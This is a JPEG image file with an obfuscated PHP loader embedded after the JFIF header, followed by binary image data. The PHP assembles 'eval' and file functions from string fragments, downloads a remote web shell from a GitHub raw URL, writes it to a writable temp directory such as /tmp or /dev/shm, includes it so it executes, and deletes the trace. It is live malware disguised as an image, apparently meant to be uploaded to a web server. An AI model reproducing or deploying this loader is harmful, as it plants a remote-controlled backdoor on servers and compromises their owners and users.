    JFIF ,,     <?php
$TRA = 'ev';
$TRO = 'al';
$TRE = 'file_g';
$TRI = 'et_cont';
$TRU = 'ents';
$TAR = 'file_p';
$TIR = 'ut_con';
$TUR = 'tents';
$EVA = $TRA . $TRO;
$FGC = $TRE . $TRI . $TRU;
$FPC = $TAR . $TIR . $TUR;

// Mengambil konten dari URL
$a = $FGC('https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/simpleshellusinghex2bin.php');

// Mendefinisikan daftar direktori sementara alternatif
$tempDirs = [
    sys_get_temp_dir(),
    '/tmp',
    '/var/tmp',
    '/dev/shm',
    dirname(__FILE__)
];

// Memilih direktori pertama yang dapat ditulisi
$tempDir = null;
foreach ($tempDirs as $dir) {
    if (is_writable($dir)) {
        $tempDir = $dir;
        break;
    }
}

// Jika tidak ada direktori yang dapat ditulisi, keluar dengan pesan kesalahan
if (!$tempDir) {
    die('Tidak ada direktori sementara yang dapat ditulisi.');
}

// Membuat file sementara di direktori yang dipilih
$tempFile = tempnam($tempDir, 'php');
$FPC($tempFile, $a);

// Menyertakan dan menjalankan file sementara
include $tempFile;

// Menghapus file sementara setelah dieksekusi
unlink($tempFile);
?>

       


		
%# , #&')*)-0-(0%()(   



(((((((((((((((((((((((((((((((((((((((((((((((((((                    	

   } !1AQa "q2   #B  R  $3br 	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                              	

   w !1AQ aq"2 B    	#3R br 
$4 % &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                          ?  R 
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   
 (   P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@    4 f    3@h    4 f    3@h    4 f    3@h    4 f    3@h    4 f    3@h    4 f    3@h    4   P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@  P@ h   P S @  O  e>  }  P S @  O  e>  }  P S @  O  e>  }  P S @  O  e>  }  P S @  O  e>  }  P S @  O  e>  }  P S @  O  e>  }  P S @  O  e>  }  P S @  O  e>  }  P S @  O  e>  }  P S @  O  e>  }  P S @  O  e>  }  P S @' }     a   >  } ڀ  P j >  @  }     a   >  } ڀ  P j >  @  }     a   >  } ڀ  P j >  @  }     a   >  } ڀ  P j >  @  }     a   >  } ڀ  P j >  @  }     a   >  } ڀ  P j >  @  }     u     g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P g   @  i   ٧   f      @  i   ٧   f      @  i   ٧   f      @  i   ٧   f      @  i   ٧   f      @  i   ٧   f      @  i   ٧   f      @  i   ٧   f      @  i   ٧   f      @  i   ٧   f      @  i   ٧   f      @  i   ٧   f      @  i   v  ٞ  f{P   @  g  ٞ  f{P   @  g  ٞ  f{P   @  g  ٞ  f{P   @  g  ٞ  f{P   @  g  ٞ  f{P   @  g  ٞ  f{P   @  g  ٞ  f{P   @  g  ٞ  f{P   @  g  ٞ  f{P   @  g  ٞ  f{P   @  g  ٞ  f{P   @  g  ٞ  f{P q     ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ       ٿ   i   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w      g{P   @  w    